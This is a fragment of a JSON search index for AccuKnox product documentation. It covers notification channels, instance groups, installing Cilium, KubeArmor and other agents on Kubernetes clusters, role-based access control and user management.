Unknown destination access on sensitive data Total number of access on each sensitive data Total number of alerts generated with severity","title":"Data Protection"},{"location":"workspace-manager/channel-integration-overview/","text":"AccuKnox employs alerts when policy violations occur. Alerts can be delivered via a number of supported notification channels. In the Workspace Manager , configure the notification channels to be used for alerting. This guide describes how to add, edit, or delete a variety of notification channel types.","title":"Overview"},{"location":"workspace-manager/edit-integration/","text":"Editing a notification channel \u00b6 To edit an integration(notification channel), Follow these steps: Go to Workspace Manager > Channel Integrations > View Integration List . Click on the channel which you want to edit The integration opens. Apply your changes to the integration by editing the field values . Click Test and If the test was successful, the integration is good to be saved., if the test was unsuccessful, user need to recheck the fields values. Click Save .","title":"Edit a Notification Channel"},{"location":"workspace-manager/edit-integration/#editing-a-notification-channel","text":"To edit an integration(notification channel), Follow these steps: Go to Workspace Manager > Channel Integrations > View Integration List . Click on the channel which you want to edit The integration opens. Apply your changes to the integration by editing the field values . Click Test and If the test was successful, the integration is good to be saved., if the test was unsuccessful, user need to recheck the fields values. Click Save .","title":"Editing a notification channel"},{"location":"workspace-manager/manage-instance-group/","text":"Create Instance Group \u00b6 Log in to Accuknox and select Manage Instance Group from the Workspace Manager menu. Click the Create Instance Group button. Enter the Instance group name. Click Save . Note: Instances can be onboarded into created VM Instance Group on the VM Onboarding page. Edit Instance Group \u00b6 Log in to Accuknox and select Manage Instance Group from the Workspace Manager menu. Click the Edit button. Enter the new Instance group name. Click Save Changes . Delete Instance Group \u00b6 Log in to Accuknox and select Manage Instance Group from the Workspace Manager menu. Click the Delete button. Click Delete to delete the Instance Group, or click Cancel to revert the unsaved changes.","title":"Manage instance groups"},{"location":"workspace-manager/manage-instance-group/#create-instance-group","text":"Log in to Accuknox and select Manage Instance Group from the Workspace Manager menu. Click the Create Instance Group button. Enter the Instance group name. Click Save . Note: Instances can be onboarded into created VM Instance Group on the VM Onboarding page.","title":"Create Instance Group"},{"location":"workspace-manager/manage-instance-group/#edit-instance-group","text":"Log in to Accuknox and select Manage Instance Group from the Workspace Manager menu. Click the Edit button. Enter the new Instance group name. Click Save Changes .","title":"Edit Instance Group"},{"location":"workspace-manager/manage-instance-group/#delete-instance-group","text":"Log in to Accuknox and select Manage Instance Group from the Workspace Manager menu. Click the Delete button. Click Delete to delete the Instance Group, or click Cancel to revert the unsaved changes.","title":"Delete Instance Group"},{"location":"workspace-manager/manage-onboarded-clusters/","text":"View Onboarded Clusters \u00b6 Log in to Accuknox and select Manage Onboarded Clusters from the Workspace Manager menu. Onboarded Clusters can be viewed here. Install Agents in Onboarded Clusters \u00b6 Log in to Accuknox and select Manage Onboarded Clusters from the Workspace Manager menu. Select the Cluster and click Next button. On the Workspace Manager page, under Manage Onboarded Clusters , Select the Cluster and click Next . You can view the following Pre-requisites and List of Agents: Pre-requisites Create Namespace Adding AccuKnox Helm repository Cilium KubeArmor Feeder Service Shared Informer Agent Policy Enforcement Agent Data Protection Pre-requisites \u00b6 Create Namespace \u00b6 kubectl create namespace accuknox-agents Adding AccuKnox Helm repository \u00b6 Required incase of installing by Helm Add AccuKnox repository to install agents helm package helm repo add accuknox-agents https://username:password@agents.accuknox.com/repository/accuknox-agents Note: Change credentials as per UI. Once repository added successfully, update the helm repository helm repo update 1. Cilium \u00b6 Installation Guide Description This agent is used to apply network policies Download Cilium CLI curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum} sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz{,.sha256sum} Install Cilium cilium install Enable Hubble in Cilium cilium hubble enable 2. KubeArmor \u00b6 Installation Guide Description This agent is used to apply system level policies Download and install karmor CLI curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Install KubeArmor karmor install 3. Feeder Service \u00b6 Installation Guide Description Feeder service deployment that collects feeds from Kubearmor and Cilium. Helm To Install agents on destination cluster helm upgrade --install feeder-service accuknox-agents/feeder-service -n accuknox-agents Set the env of Feeder Service kubectl set env deploy/feeder-service -n accuknox-agents tenant_id=000 cluster_id=000 Note: The tenant_id & cluster_id will vary according to different clusters. 4. Shared Informer Agent \u00b6 Installation Guide Description this agent authenticates with your cluster and collects information regarding entities like nodes, pods & namespaces. Helm To Install agents on destination cluster helm upgrade --install shared-informer-agent-chart accuknox-agents/shared-informer-agent-chart -n accuknox-agents 5. Policy Enforcement Agent \u00b6 Installation Guide Description This agent authenticates with your cluster and enforces label and policy. Helm To Install agents on destination cluster helm upgrade --install policy-enforcement-agent accuknox-agents/policy-enforcement-agent-chart -n accuknox-agents Set the env of policy-enforcement-agent kubectl set env deploy/policy-enforcement-agent -n accuknox-agents workspace_id=000 Note: The workspace_id will vary according to different clusters. 6. Data Protection \u00b6 Installation Guide Description Trains a model based on container workload type. It constantly monitors the syscalls happening inside the container. After training, if the vae sees syscalls happening in a way not seen in training phase, it will send high reconstruction error with detailed forensics information. To Install agents on destination cluster helm upgrade --install knox-containersec-chart accuknox-agents/knox-containersec-chart -n accuknox-agents","title":"Manage onboarded cluster"},{"location":"workspace-manager/manage-onboarded-clusters/#view-onboarded-clusters","text":"Log in to Accuknox and select Manage Onboarded Clusters from the Workspace Manager menu. Onboarded Clusters can be viewed here.","title":"View Onboarded Clusters"},{"location":"workspace-manager/manage-onboarded-clusters/#install-agents-in-onboarded-clusters","text":"Log in to Accuknox and select Manage Onboarded Clusters from the Workspace Manager menu. Select the Cluster and click Next button. On the Workspace Manager page, under Manage Onboarded Clusters , Select the Cluster and click Next . You can view the following Pre-requisites and List of Agents: Pre-requisites Create Namespace Adding AccuKnox Helm repository Cilium KubeArmor Feeder Service Shared Informer Agent Policy Enforcement Agent Data Protection","title":"Install Agents in Onboarded Clusters"},{"location":"workspace-manager/manage-onboarded-clusters/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"workspace-manager/manage-onboarded-clusters/#create-namespace","text":"kubectl create namespace accuknox-agents","title":"Create Namespace"},{"location":"workspace-manager/manage-onboarded-clusters/#adding-accuknox-helm-repository","text":"Required incase of installing by Helm Add AccuKnox repository to install agents helm package helm repo add accuknox-agents https://username:password@agents.accuknox.com/repository/accuknox-agents Note: Change credentials as per UI. Once repository added successfully, update the helm repository helm repo update","title":"Adding AccuKnox Helm repository"},{"location":"workspace-manager/manage-onboarded-clusters/#1-cilium","text":"Installation Guide Description This agent is used to apply network policies Download Cilium CLI curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum} sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz{,.sha256sum} Install Cilium cilium install Enable Hubble in Cilium cilium hubble enable","title":"1. Cilium"},{"location":"workspace-manager/manage-onboarded-clusters/#2-kubearmor","text":"Installation Guide Description This agent is used to apply system level policies Download and install karmor CLI curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Install KubeArmor karmor install","title":"2. KubeArmor"},{"location":"workspace-manager/manage-onboarded-clusters/#3-feeder-service","text":"Installation Guide Description Feeder service deployment that collects feeds from Kubearmor and Cilium. Helm To Install agents on destination cluster helm upgrade --install feeder-service accuknox-agents/feeder-service -n accuknox-agents Set the env of Feeder Service kubectl set env deploy/feeder-service -n accuknox-agents tenant_id=000 cluster_id=000 Note: The tenant_id & cluster_id will vary according to different clusters.","title":"3. Feeder Service"},{"location":"workspace-manager/manage-onboarded-clusters/#4-shared-informer-agent","text":"Installation Guide Description this agent authenticates with your cluster and collects information regarding entities like nodes, pods & namespaces. Helm To Install agents on destination cluster helm upgrade --install shared-informer-agent-chart accuknox-agents/shared-informer-agent-chart -n accuknox-agents","title":"4. Shared Informer Agent"},{"location":"workspace-manager/manage-onboarded-clusters/#5-policy-enforcement-agent","text":"Installation Guide Description This agent authenticates with your cluster and enforces label and policy. Helm To Install agents on destination cluster helm upgrade --install policy-enforcement-agent accuknox-agents/policy-enforcement-agent-chart -n accuknox-agents Set the env of policy-enforcement-agent kubectl set env deploy/policy-enforcement-agent -n accuknox-agents workspace_id=000 Note: The workspace_id will vary according to different clusters.","title":"5. Policy Enforcement Agent"},{"location":"workspace-manager/manage-onboarded-clusters/#6-data-protection","text":"Installation Guide Description Trains a model based on container workload type. It constantly monitors the syscalls happening inside the container. After training, if the vae sees syscalls happening in a way not seen in training phase, it will send high reconstruction error with detailed forensics information. To Install agents on destination cluster helm upgrade --install knox-containersec-chart accuknox-agents/knox-containersec-chart -n accuknox-agents","title":"6. Data Protection"},{"location":"workspace-manager/manage-service-account/","text":"Edit a Service Account \u00b6 Log in to Accuknox and select Manage Service Accounts from the Workspace Manager menu. Click the Edit button. Enter the new Service account name. Click Save Changes . Delete a Service Account \u00b6 Log in to Accuknox and select Manage Service Accounts from the Workspace Manager menu. Click the Delete button. Click Delete to delete the Instance Group, or click Cancel to revert the unsaved changes.","title":"Manage service accounts"},{"location":"workspace-manager/manage-service-account/#edit-a-service-account","text":"Log in to Accuknox and select Manage Service Accounts from the Workspace Manager menu. Click the Edit button. Enter the new Service account name. Click Save Changes .","title":"Edit a Service Account"},{"location":"workspace-manager/manage-service-account/#delete-a-service-account","text":"Log in to Accuknox and select Manage Service Accounts from the Workspace Manager menu. Click the Delete button. Click Delete to delete the Instance Group, or click Cancel to revert the unsaved changes.","title":"Delete a Service Account"},{"location":"workspace-manager/role_based_access_control/","text":"Steps to be followed in Role-Based Access Control \u00b6 Select the Workspace Manager > Role-Based Access Control. This is the second subsection of workspace manager. This subsection is used to assign the existing roles access permissions, or you can create new roles. This subsection is divided into 7 stages, Cluster Management Policy Management Account Management Data Protection Anomaly Detection User Management Data Pipeline Step 1 - User Management \u00b6 Select the Workspace Manager -> Role-Based Access Control > User Management stage. This stage is used to assign the existing roles access permissions for Users in granular level. Here you can use existing roles or you can create custom roles. Click the Create Custom Role button. It will show Create a New Role dialog box. Here you can see two input fields. First field enter your New custom role name then the second field click the dropdown box and select your role type and Click Next button. Now you have to set Granular Roles for your new custom role then click the Save button. Once you click the save button It will show the confirmation dialog box. Here you have two options: Cancel and Create. If you don\u2019t want to create a new role then click the Cancel button, Otherwise click the Create button it will create your new custom role. Step 2 - Cluster Management \u00b6 Select the Workspace Manager -> Role-Based Access Control > Cluster Management stage. This stage is used to assign the existing roles access permissions for Cluster Management. Here you can also create custom roles for Policy Management. Step 3 - Policy Management \u00b6 Select the Workspace Manager > Role-Based Access Control -> Policy Management stage. This stage is used to assign the existing roles access permissions for Policy Management. Here you can also create custom roles for Policy Management. Step 4 - Account Management \u00b6 Select the Workspace Manager -> Role-Based Access Control -> Account Management stage. This stage is used to assign the existing roles access permissions for Account Management. Here you can also create custom roles for Account Management. Step 5 - Data Protection \u00b6 Select the Workspace Manager -> Role-Based Access Control -> Data Protection stage. This stage is used to assign the existing roles access permissions for Data Protection. Here you can also create custom roles for Data Protection. Step 6 - Anomaly Detection \u00b6 Select the Workspace Manager -> Role-Based Access Control -> Anomaly Detection stage. This stage is used to assign the existing roles access permissions for Anomaly Detection. Here you can also create custom roles for Anomaly Detection. Step 7 - Data Pipeline \u00b6 Select the Workspace Manager -> Role-Based Access Control -> Data Pipeline stage. This stage is used to assign the existing roles access permissions for Data Pipeline. Here you can also create custom roles for Data Pipeline.","title":"Role-based access control"},{"location":"workspace-manager/role_based_access_control/#steps-to-be-followed-in-role-based-access-control","text":"Select the Workspace Manager > Role-Based Access Control. This is the second subsection of workspace manager. This subsection is used to assign the existing roles access permissions, or you can create new roles. This subsection is divided into 7 stages, Cluster Management Policy Management Account Management Data Protection Anomaly Detection User Management Data Pipeline","title":"Steps to be followed in Role-Based Access Control"},{"location":"workspace-manager/role_based_access_control/#step-1-user-management","text":"Select the Workspace Manager -> Role-Based Access Control > User Management stage. This stage is used to assign the existing roles access permissions for Users in granular level. Here you can use existing roles or you can create custom roles. Click the Create Custom Role button. It will show Create a New Role dialog box. Here you can see two input fields. First field enter your New custom role name then the second field click the dropdown box and select your role type and Click Next button. Now you have to set Granular Roles for your new custom role then click the Save button. Once you click the save button It will show the confirmation dialog box. Here you have two options: Cancel and Create. If you don\u2019t want to create a new role then click the Cancel button, Otherwise click the Create button it will create your new custom role.","title":"Step 1 - User Management"},{"location":"workspace-manager/role_based_access_control/#step-2-cluster-management","text":"Select the Workspace Manager -> Role-Based Access Control > Cluster Management stage. This stage is used to assign the existing roles access permissions for Cluster Management. Here you can also create custom roles for Policy Management.","title":"Step 2 - Cluster Management"},{"location":"workspace-manager/role_based_access_control/#step-3-policy-management","text":"Select the Workspace Manager > Role-Based Access Control -> Policy Management stage. This stage is used to assign the existing roles access permissions for Policy Management. Here you can also create custom roles for Policy Management.","title":"Step 3 - Policy Management"},{"location":"workspace-manager/role_based_access_control/#step-4-account-management","text":"Select the Workspace Manager -> Role-Based Access Control -> Account Management stage. This stage is used to assign the existing roles access permissions for Account Management. Here you can also create custom roles for Account Management.","title":"Step 4 - Account Management"},{"location":"workspace-manager/role_based_access_control/#step-5-data-protection","text":"Select the Workspace Manager -> Role-Based Access Control -> Data Protection stage. This stage is used to assign the existing roles access permissions for Data Protection. Here you can also create custom roles for Data Protection.","title":"Step 5 - Data Protection"},{"location":"workspace-manager/role_based_access_control/#step-6-anomaly-detection","text":"Select the Workspace Manager -> Role-Based Access Control -> Anomaly Detection stage. This stage is used to assign the existing roles access permissions for Anomaly Detection. Here you can also create custom roles for Anomaly Detection.","title":"Step 6 - Anomaly Detection"},{"location":"workspace-manager/role_based_access_control/#step-7-data-pipeline","text":"Select the Workspace Manager -> Role-Based Access Control -> Data Pipeline stage. This stage is used to assign the existing roles access permissions for Data Pipeline. Here you can also create custom roles for Data Pipeline.","title":"Step 7 - Data Pipeline"},{"location":"workspace-manager/user_management/","text":"Invite and Create a User \u00b6 Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Click the Invite users to workspace button. On the Workspace Manager page, under User Management , click Invite users to workspace . You can view the following options: Invite User Create User Add Users in Bulk Invite User \u00b6 Select Invite User Enter the user\u2019s email address Select the Role 4. Click Invite to send the user invite, or click Cancel to discard the user. Create User \u00b6 Select Create User Enter the user\u2019s first name and last name and email address. Select the Role 4. Click Invite to send the user invite, or click Cancel to discard the user. Add Users in Bulk \u00b6 Select Add Users in Bulk 2. Download the sample CSV file. 3. Open and enter the user\u2019s first name and last name and email address, role in the downloaded CSV template. 4. Upload the CSV file. 5. Click Invite to send the user invite, or click Cancel to discard the user. Edit User Information \u00b6 To edit an existing user: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Users in the workspace . Select the user from the Users in the workspace table. Optional: Edit the email address. Optional: Edit the first name / last name. Optional: Toggle the Role switch to change the roles. Click Confirm to save the changes, or Cancel to revert the unsaved changes. Deactivate a User \u00b6 To deactivate an existing user: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Users in the workspace . Select the user from the Users in the workspace table. Click Deactivate User . Activate a User \u00b6 To activate an existing deactivated user: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Deactivated Users . Select the user from the Deactivated Users table. Click Activate User . Delete a User \u00b6 To delete an existing user: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Users in the workspace . Select the user from the Users in the workspace table. Click Delete User . Click delete to confirm the change. Re-invite a User \u00b6 To resend or delete a pending invite: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Pending Invites . Select the user from the Pending Invites table. Click Resend or Cancel to delete the pending invitation Click confirm or delete to do the respective procedure.","title":"User Management"},{"location":"workspace-manager/user_management/#invite-and-create-a-user","text":"Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Click the Invite users to workspace button. On the Workspace Manager page, under User Management , click Invite users to workspace . You can view the following options: Invite User Create User Add Users in Bulk","title":"Invite and Create a User"},{"location":"workspace-manager/user_management/#invite-user","text":"Select Invite User Enter the user\u2019s email address Select the Role 4. Click Invite to send the user invite, or click Cancel to discard the user.","title":"Invite User"},{"location":"workspace-manager/user_management/#create-user","text":"Select Create User Enter the user\u2019s first name and last name and email address. Select the Role 4. Click Invite to send the user invite, or click Cancel to discard the user.","title":"Create User"},{"location":"workspace-manager/user_management/#add-users-in-bulk","text":"Select Add Users in Bulk 2. Download the sample CSV file. 3. Open and enter the user\u2019s first name and last name and email address, role in the downloaded CSV template. 4. Upload the CSV file. 5. Click Invite to send the user invite, or click Cancel to discard the user.","title":"Add Users in Bulk"},{"location":"workspace-manager/user_management/#edit-user-information","text":"To edit an existing user: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Users in the workspace . Select the user from the Users in the workspace table. Optional: Edit the email address. Optional: Edit the first name / last name. Optional: Toggle the Role switch to change the roles. Click Confirm to save the changes, or Cancel to revert the unsaved changes.","title":"Edit User Information"},{"location":"workspace-manager/user_management/#deactivate-a-user","text":"To deactivate an existing user: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Users in the workspace . Select the user from the Users in the workspace table. Click Deactivate User .","title":"Deactivate a User"},{"location":"workspace-manager/user_management/#activate-a-user","text":"To activate an existing deactivated user: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Deactivated Users . Select the user from the Deactivated Users table. Click Activate User .","title":"Activate a User"},{"location":"workspace-manager/user_management/#delete-a-user","text":"To delete an existing user: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Users in the workspace . Select the user from the Users in the workspace table. Click Delete User . Click delete to confirm the change.","title":"Delete a User"},{"location":"workspace-manager/user_management/#re-invite-a-user","text":"To resend or delete a pending invite: Log in to Accuknox as administrator and select User Management from the Workspace Manager menu. Select Pending Invites . Select the user from the Pending Invites table. Click Resend or Cancel to delete the pending invitation Click confirm or delete to do the respective procedure.","title":"Re-invite a User"}]}